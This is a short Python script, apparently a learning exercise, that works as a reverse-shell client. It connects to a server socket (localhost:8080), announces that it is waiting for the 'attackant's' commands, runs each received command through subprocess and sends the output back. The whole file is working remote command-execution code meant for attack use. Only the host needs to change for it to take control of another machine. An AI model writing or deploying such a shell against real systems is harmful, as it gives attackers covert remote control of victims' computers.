import socket
import subprocess
import shlex

hote = "localhost"
port = 8080

connexion_avec_serveur = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connexion_avec_serveur.connect((hote, port))
print("I am waiting command of attackant on port {}".format(port))


msg_recu = b""
while msg_recu != b"end":
    msg_recu = connexion_avec_serveur.recv(10024)
    msg=msg_recu.decode()
    print(msg)
    args = shlex.split(msg)
    try:
        process = subprocess.Popen(args, stdout=subprocess.PIPE,
                                   stderr=subprocess.PIPE,
                                   encoding="latin")
        
        
        stdout = process.stdout.read()
        stderr = process.stderr.read()
        
        data=str(stdout)+";;;"+str(stderr)
        print(data)
        connexion_avec_serveur.send(data.encode())
    except:
        connexion_avec_serveur.send("Error".encode())


print("Bye Bye")
connexion_avec_serveur.close()
